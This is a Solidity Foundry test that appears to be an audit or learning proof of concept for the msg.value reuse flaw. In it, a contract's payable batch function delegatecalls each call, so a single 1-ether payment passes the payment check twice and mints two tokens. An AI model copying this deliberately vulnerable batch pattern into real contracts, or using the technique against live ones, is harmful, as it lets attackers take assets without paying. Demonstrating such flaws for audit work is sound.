// SPDX-License-Identifier: MIT
pragma solidity ^0.7.6;
pragma experimental ABIEncoderV2;

import {Test, console} from "forge-std/Test.sol";
import {PuppyRaffle} from "../src/PuppyRaffle.sol";
import {ERC20} from "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MsgValueAttack is Test {
    function test_msg_value() public {
        Puppy puppy = new Puppy("Puppy", "PUP");
        Victim victim = new Victim(puppy);
        vm.deal(address(victim), 1 ether);
        bytes[] memory calls = new bytes[](2);
        calls[0] = abi.encodeWithSignature("echo()");
        calls[1] = abi.encodeWithSignature("echo()");

        (bool[] memory successes, bytes[] memory results) = victim.batch{value: 1 ether}(calls, true);
        for (uint256 i = 0; i < successes.length; i++) {
            if (successes[i]) {
                console.log("Success: %s", string(results[i]));
            } else {
                console.log("Failure: %s", string(results[i]));
            }
        }
        assertEq(puppy.balanceOf(address(this)), 2);
    }
}

abstract contract Batch {
    function batch(bytes[] calldata calls, bool revertOnFail)
        external
        payable
        returns (bool[] memory successes, bytes[] memory results)
    {
        successes = new bool[](calls.length);
        results = new bytes[](calls.length);
        for (uint256 i = 0; i < calls.length; i++) {
            (bool success, bytes memory result) = address(this).delegatecall(calls[i]);
            require(success || !revertOnFail, _getRevertMsg(result));
            successes[i] = success;
            results[i] = result;
        }
    }

    function _getRevertMsg(bytes memory _returnData) internal pure returns (string memory) {
        // If the _res length is less than 68, then the transaction failed silently (without a revert message)
        if (_returnData.length < 68) return "Transaction reverted silently";

        assembly {
            // Slice the sighash.
            _returnData := add(_returnData, 0x04)
        }
        return abi.decode(_returnData, (string)); // All that remains is the revert string
    }
}

contract Puppy is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {}

    function mint(address to, uint256 amount) external {
        _mint(to, amount);
    }
}

contract Victim is Batch {
    Puppy public puppy;

    constructor(Puppy _puppy) {
        puppy = _puppy;
    }

    function echo() public payable {
        require(msg.value == 1 ether, "msg.value must be equal to 1 ether");
        console.log("msg.value: %s", msg.value);
        puppy.mint(msg.sender, 1);
    }
}
